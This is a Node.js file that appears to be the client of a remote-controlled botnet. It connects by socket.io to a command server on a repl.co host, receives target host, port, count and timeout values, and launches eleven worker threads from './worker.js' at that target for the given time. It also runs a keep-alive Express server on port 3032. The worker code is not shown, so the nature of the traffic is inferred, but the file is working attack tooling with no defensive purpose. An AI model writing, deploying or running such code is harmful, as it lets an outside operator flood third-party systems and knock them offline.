const { Worker } = require('worker_threads');
const io = require('socket.io-client')
const e = require('express')
const a = e()

a.get('/', (b,c)=>{b.end('a');})

let socket

let sending = false;

function send({ host, port, count, timeout }) {
  if (sending) return
  sending = true;
  for (i = 0; i <= 10; i++) {
    const worker = new Worker('./worker.js', {
      workerData: {
        host,
        port,
        count
      }
    });

    setTimeout(() => {
      worker.terminate()
      sending = false;
    }, timeout)
  }
}

function initSocket() {
  console.log('connecting')
  socket = io('wss://nexo.1nchh.repl.co')
  
  socket.on('connect', () => {
    console.log('Connected to server')
    a.listen(3032)
  })

  socket.on('message', (data) => {
    console.log(data)
    const { host, port, count, timeout } = data

    send({
      host,
      port,
      count,
      timeout
    })
  })

  socket.on('end', () => {
    console.log('Socket closed')
    setTimeout(initSocket, 3000)
    a.close()
  })

  socket.on('error', () => {
    console.log('Socket error')
    setTimeout(initSocket, 3000)
  })
}

initSocket()
